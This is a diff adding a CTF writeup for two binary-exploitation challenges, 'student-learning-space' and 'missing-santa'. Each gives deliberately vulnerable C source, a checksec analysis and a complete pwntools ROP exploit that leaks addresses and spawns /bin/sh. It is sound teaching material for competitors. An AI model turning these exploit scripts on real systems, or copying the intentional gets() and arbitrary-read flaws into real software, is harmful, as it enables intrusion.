@@ -392,3 +392,318 @@ if __name__ == "__main__":
 ```
 
 And yay! We get a shell!
+
+# Writeups — CTF
+## Pwn - student-learning-space
+
+::dist[Download challenge files]{file="iycep2026/pwn/student-learning-space/dist.zip"}
+
+Here is the source code:
+
+```c
+// gcc -std=c99 -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -o student-learning-space main.c
+#include <stdio.h>
+#include <unistd.h>
+
+void setup() {
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void debug_shell(char *const prog, char *const *argv, char *const *envp) {
+  puts("Here is your debug shell!\n");
+  execve(prog, argv, envp);
+}
+
+void sls() {
+  char buf[0x100];
+  puts("Thank you for trying out our beta version of the Student Learning "
+       "Space!");
+  puts("We are currently in the process of developing this platform, and we "
+       "appreciate your feedback.");
+  printf("If you ever need to drop down to a debug shell in order to diagnose "
+         "an issue, it can be found here: %p\n",
+         debug_shell);
+  puts("Our debug shell runs the best shell program: /bin/sh");
+  printf("\n");
+  puts("We have created an AI assistant to help you with your learning, called "
+       "SLAI (pronounced sly).");
+  puts("SLAI is designed to provide you with personalized learning experiences "
+       "and support your academic journey.");
+  puts("We hope you enjoy using SLAI and find it helpful in your studies!");
+  printf("\n");
+  puts("What do you want to learn from SLAI today?");
+  // Need to do user testing to see how long prompt is to allocate buffer
+  gets(buf);
+}
+
+int main() {
+  setup();
+  sls();
+  return 0;
+}
+
+// I am tired of being constrained by Christmas merry christmas beta testers!
+void gifts() { __asm__("pop %rdi; ret; pop %rsi; ret; pop %rdx; ret"); }
+```
+
+We immediately see that there is a buffer overflow in `sls()`, and that `debug_shell()` has been kindly provided to us to pop a shell!
+
+Running `checksec`:
+
+```
+❯ pwn checksec student-learning-space
+[*] '/home/sherlock/Documents/CTF/authoring/iycep26/challenge-setting/pwn/student-learning-space/sol/student-learning-space'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+Immediately off the bat, we can see that there is no canary, allowing us to easily buffer overflow to redirect control flow. However, PIE is enabled, meaning that we need to leak an address before knowing where the binary has been loaded.
+
+We also note that `debug_shell()` takes in 3 arguments for `execve()`, meaning we need to set up the arguments to call shell by ourselves. Thankfully, we can use Return-Oriented Programming to help us set up the arguments for our shell.
+
+Running our binary through `ROPgadget`, we see the following few gadgets of interest:
+
+```
+0x0000000000001302 : pop rdi ; ret
+0x0000000000001304 : pop rsi ; ret
+0x0000000000001306 : pop rdx ; ret
+```
+
+If we recall the x84-64 calling convention, our first argument (`prog`) is placed in to `rdi`, our second argument (`argv`) is placed into `rsi`, and our third argument (`envp`) is placed into `rdx`. By referencing the [linux manpages](https://man7.org/linux/man-pages/man2/execve.2.html), we can come to the conclusion that we need to put a pointer to `/bin/sh` in `prog`, and set both `argv` and `envp` to `null` (i.e. `0x0`). These gadgets allow us to pop our custom values off the stack and into the registers, setting up the state for us to pop a shell.
+
+But how do we get a pointer to `/bin/sh`? If we take a look in our binary, we notice that `/bin/sh` is actually printed out in a `puts()` call! In order to print it out, that means our program must be storing a `/bin/sh\x00` null-terminated string somewhere in memory, at an offset from where our binary is loaded (For those interested, the string is stored in the `.data` segment of the ELF). That means, once we know the base address at which the binary is loaded to, we can find the address at which `/bin/sh\x00` exists in our binary, and therefore put the pointer to the start of that string as our `prog`!
+
+The program nicely leaks us the address of `debug_shell()`, so with that information we can find the PIE base of the binary and calculate the addresses of the gadgets we need to call, as well as the location of `/bin/sh\x00` in the binary.
+
+In a nutshell, we want to do the following:
+- Leak the PIE base by reading the `debug_shell()` address
+- Calculate the addresses of the ROP gadgets and `/bin/sh\x00` in memory
+- Construct a ROP chain to set up our arguments to call `/bin/sh`;
+- Call `debug_shell()` with our new arguments set up to execute `/bin/sh`!
+
+Here is the solve:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./student-learning-space_patched")
+libc = ELF("libc")
+ld = ELF("ld")
+
+context.binary = exe
+
+gdbscript = """
+set breakpoint pending on
+b *main
+continue
+"""
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path], stdin=PTY, stdout=PTY)
+        if args.GDB:
+            gdb.attach(r, gdbscript=gdbscript)
+            pause()
+    else:
+        r = remote("localhost", 50001)
+
+    return r
+
+
+def main():
+    r = conn()
+    payload = b"A" * 0x108
+    r.recvuntil(b"here: ")
+    leak = int(r.recvline().strip(), 16) - exe.sym["debug_shell"]
+    pop_rdi = leak + 0x0000000000001302
+    pop_rsi = leak + 0x0000000000001304
+    pop_rdx = leak + 0x0000000000001306
+    bin_sh = leak +  next(exe.search(b"/bin/sh\x00"))
+    payload += flat(
+        pop_rdi,
+        bin_sh,
+        pop_rsi,
+        0,
+        pop_rdx,
+        0,
+        leak + exe.sym["debug_shell"], # Actually can directly ret to execve plt or debug_shell both work but debug_shell is intended
+    )
+    r.sendlineafter(b"?\n", payload)
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Pwn - missing-santa
+
+::dist[Download challenge files]{file="iycep2026/pwn/missing-santa/dist.zip"}
+
+Here is the source code:
+
+```c
+// gcc -std=c99 -fno-stack-protector -fno-pie -no-pie -Wl,-z,relro,-z,now,-z,noexecstack -o missing-santa main.c
+#include <stdio.h>
+#include <unistd.h>
+
+void setup() {
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void tis_the_season_of_gifting_fa_la_la_la_la_la_la_la_la() {
+    char buf[0x20];
+    printf("Deck the halls with boughs of holly, fa la la la la la la la la\n");
+    printf("but where are my gifts???\n");
+    printf("Enter your gift:\n>");
+    fgets(buf, 0x100, stdin);
+}
+
+void menu(){
+    printf("1. Give gifts!\n");
+    printf("2. View Santa's debuginfo\n");
+    printf("> ");
+}
+
+void debuginfo() {
+    printf("Santa's debuginfo: \n");
+    printf("What address do you want to inspect?\n");
+    printf("> ");
+    char *address;
+    scanf("%p", &address);
+    getchar();
+    printf("Contents at %p: %s\n", address, address);
+}
+
+int main() {
+  setup();
+  for(long long i = 0; i < 2; i++) {
+      menu();
+      char choice;
+      choice = getchar();
+      getchar();
+      if (choice == '1') {
+          tis_the_season_of_gifting_fa_la_la_la_la_la_la_la_la();
+      } else if (choice == '2') {
+          debuginfo();
+      }
+  }
+  return 0;
+}
+
+//??? WHERE ARE MY GIFTS???
+```
+
+We are presented with a menu with 2 choices: to either send a gift or to view the data at any given address via the debuginfo. No win function, so we need to ROP our way to a shell.
+
+```
+pwn/missing-santa/sol via  v16.2.1-gcc via  v3.14.7
+❯ pwn checksec missing-santa
+[*] '/home/sherlock/Documents/CTF/authoring/iycep26/challenge-setting/pwn/missing-santa/sol/missing-santa'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+We notice that there is no PIE and no canary, which is quite cool. This means that we know where our binary is loaded to, allowing us to directly reference the addresses in our exploit. In our binary, there is this thing called the Global Offset Table (GOT) that stores the addresses of external library functions (such as libc). If we send in the address of the GOT entry for a known libc function, we can thereby get its address and calculate where libc is loaded in our memory space (recall that libc is affected by ASLR).
+
+Hence, we can leak the libc base by leaking the GOT:
+
+```python
+r.sendlineafter(b"> ", str(2).encode())
+r.sendlineafter(b"> ", b"0x000000403fe0")
+r.recvuntil(b": ")
+leak = u64(r.recvn(6).ljust(8, b"\x00")) - libc.sym["setvbuf"]
+info(f"Libc base: {hex(leak)}")
+```
+
+Note that we chose `setvbuf()` instead of `printf()`, because the least significant byte of `printf()`'s address is a null byte, which would be terminated by the format specifier `%s` used by `printf()`.
+
+Then, we can use the binary instructions in libc to do ROP, and give us the shell! Because the string `/bin/sh\x00` exists within the libc binary itself, we can therefore calculate its address with the libc address leak and pass it in as an argument to `system()`. Note the extra `ret` gadget used to make sure our stack is 16-byte aligned.
+
+```python
+libc_pop_rdi_ret = leak + 0x000000000010f78b
+libc_ret = leak + 0x000000000002882f
+payload = flat(
+	b"A" * 0x28,
+	libc_ret,
+	libc_pop_rdi_ret,
+	leak + next(libc.search(b"/bin/sh\x00")),
+	leak + libc.sym["system"],
+)
+r.sendlineafter(b">", payload)
+```
+
+Here is the full solve:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./missing-santa_patched")
+libc = ELF("libc")
+ld = ELF("ld")
+
+context.binary = exe
+context.terminal = ["zellij", "action", "new-pane", "--"]
+
+gdbscript = """
+set breakpoint pending on
+b *main
+continue
+"""
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path], stdin=PTY, stdout=PTY)
+        if args.GDB:
+            gdb.attach(r, gdbscript=gdbscript)
+            pause()
+    else:
+        r = remote("localhost", 50001)
+
+    return r
+
+
+def main():
+    r = conn()
+    r.sendlineafter(b"> ", str(2).encode())
+    r.sendlineafter(b"> ", b"0x000000403fe0")
+    r.recvuntil(b": ")
+    leak = u64(r.recvn(6).ljust(8, b"\x00")) - libc.sym["setvbuf"]
+    info(f"Libc base: {hex(leak)}")
+    r.sendlineafter(b"> ", str(1).encode())
+    libc_pop_rdi_ret = leak + 0x000000000010f78b
+    libc_ret = leak + 0x000000000002882f
+    payload = flat(
+        b"A" * 0x28,
+        libc_ret,
+        libc_pop_rdi_ret,
+        leak + next(libc.search(b"/bin/sh\x00")),
+        leak + libc.sym["system"],
+    )
+    r.sendlineafter(b">", payload)
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
